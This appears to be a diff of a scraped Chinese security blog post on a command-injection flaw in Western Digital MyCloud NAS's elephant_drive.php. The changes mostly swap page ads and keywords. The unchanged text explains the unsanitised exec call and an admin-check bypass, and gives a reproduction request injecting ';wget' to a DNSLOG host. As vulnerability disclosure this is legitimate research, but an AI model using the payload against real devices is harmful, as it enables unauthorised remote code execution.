@@ -7,17 +7,17 @@ asset_dir: assets/西部数码-nas-elephant_drive.php-命令执行漏洞
 # 西部数码 NAS elephant\_drive.php 命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/9/11 13:05
-- 546浏览
+- 549浏览
 - [0评论](#comment)
 - 15分钟阅读
 
 深入探索
 
-web服务器
+SQL
 
-滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨
+Western Digital
 
-服务器安全服务
+软件
 
 ---
 
@@ -25,7 +25,7 @@ web服务器
 
 Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS elephant\_drive.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
 
-漏洞预警服务
+漏洞扫描服务
 
 # 影响版本
 
@@ -38,14 +38,6 @@ Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集�
 > body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "
 
 # 漏洞分析
-
-深入探索
-
-云安全解决方案
-
-网络安全会议
-
-漏洞扫描服务
 
 直接看 `elephant_drive.php` 其业务实现逻辑如下
 
@@ -77,17 +69,9 @@ case "create":
        $ret = create_account($toURL, $reg_agg);
 ```
 
-深入探索
-
-恶意软件分析工具
-
-代码安全审计
-
-Web安全课程
-
 当attion=create时，`$_password` 是直接拼接进**exec**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。
 
-计算机驱动器和存储设备
+硬盘驱动器
 
 # 漏洞复现
 
@@ -106,7 +90,7 @@ attion=create&e_email=test@testxxxx.com&e_password=;wget elephant.dnslog.pt;
 
 成功在DNSLOG平台收到DNS和HTTP请求
 
-硬盘驱动器
+网络存储
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
